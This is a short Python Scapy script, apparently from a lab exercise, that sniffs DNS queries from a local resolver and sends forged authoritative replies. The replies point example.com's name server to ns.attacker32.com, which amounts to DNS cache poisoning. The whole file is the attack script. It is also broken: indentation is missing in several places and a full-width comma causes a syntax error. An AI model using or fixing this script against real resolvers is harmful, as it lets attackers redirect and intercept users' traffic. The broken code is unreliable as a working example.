#!/usr/bin/env python3
from scapy.all import *
def spoof_dns(pkt):
  if(DNS in pkt and'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):

  IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

  UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

  NSsec1 = DNSRR ( rrname='example.com', type='NS',
  ttl=259200 ， rdata='ns.attacker32.com')
  DNSpkt = DNS (id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,qdcount=1, ancount=0, nscount=1, arcount=0,ns=NSsec1)

  spoofpkt = IPpkt/UDPpkt/DNSpkt

  send (spoofpkt)
 f = 'udp and dst port 53 and src 10.9.0.53'
 pkt = sniff(iface='br-12b54642799f', filter=f, prn=spoof_dns)

